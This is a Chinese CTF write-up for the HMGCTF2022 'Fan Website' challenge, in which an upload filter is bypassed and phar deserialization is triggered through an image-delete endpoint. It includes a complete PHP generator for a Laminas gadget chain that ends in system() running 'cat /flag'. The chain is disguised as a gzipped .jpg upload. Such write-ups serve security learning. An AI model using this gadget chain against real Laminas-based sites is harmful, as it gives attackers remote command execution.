---
title: '[HMGCTF2022]Fan Website'
date: 2025-02-19 21:49:44
tags: phar反序列化
categories: 刷题笔记
---

## [HMGCTF2022]Fan Website

我们访问www.zip能拿到源码

我们在module/Album/config/module.config.php里发现一个新路由album

![image-20250219220714976](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502192207077.png)

并且发现了一个控制台，可以进行上传、删除等操作

我们在imgdeleteAction方法里发现一个@unlink

```php
    public function imgdeleteAction()
    {
        $request = $this->getRequest();
        if(isset($request->getPost()['imgpath'])){
            $imgpath = $request->getPost()['imgpath'];
            $base = substr($imgpath,-4,4);
            if(in_array($base,$this->white_list)){     //白名单
                @unlink($imgpath);
            }else{
                echo 'Only Img File Can Be Deleted!';
            }
        }
    }
```

并且在imguploadAction方法里发现一个正则

```
 if (preg_match("/<\?|php|HALT\_COMPILER/i", $cont )) {
                        die("Not This");
                    }
```

它过滤了HALT\_COMPILER，我们猜测这是一个phar反序列化

绕过正则参考:https://www.freebuf.com/articles/web/291992.html

构造出生成phar文件的php源码为：

```php
<?php 
namespace Laminas\View\Resolver{
	class TemplateMapResolver{
		protected $map = ["setBody"=>"system"];
	}
}
namespace Laminas\View\Renderer{

	class PhpRenderer{

		private $__helpers;

		function __construct(){

			$this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();

		}

	}

}

namespace Laminas\Log\Writer{

	abstract class AbstractWriter{}
	
	class Mail extends AbstractWriter{

		protected $eventsToMail = ["cat /flag"];  								//  cmd  cmd cmd
		protected $subjectPrependText = null;

		protected $mail;

		function __construct(){

			$this->mail = new \Laminas\View\Renderer\PhpRenderer();
		}
	}
}
namespace Laminas\Log{
	class Logger{
		protected $writers;
		function __construct(){
			$this->writers = [new \Laminas\Log\Writer\Mail()];
		}
	}
}

namespace{
$a = new \Laminas\Log\Logger();
$phar = new Phar("shell.phar"); //后缀名必须为 phar
$phar->startBuffering();
$phar->setStub("XXX<?php XXX __HALT_COMPILER(); ?>"); 
$phar->setMetadata($a); //将自定义的 meta-data 存入 manifest
$phar->addFromString("a", str_repeat('123',1000000)); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();}

?>

```

将生成的phar文件添加足够数据保证压缩后大于3KB，然后再通过gzip压缩并更名为`test.jpg`并上传。

我们访问/album/imgupload上传图片

![image-20250220194417755](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502201944863.png)

接着去删除页面通过phar伪协议删除来触发反序列化，得到flag

![image-20250220200952765](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502202009933.png)



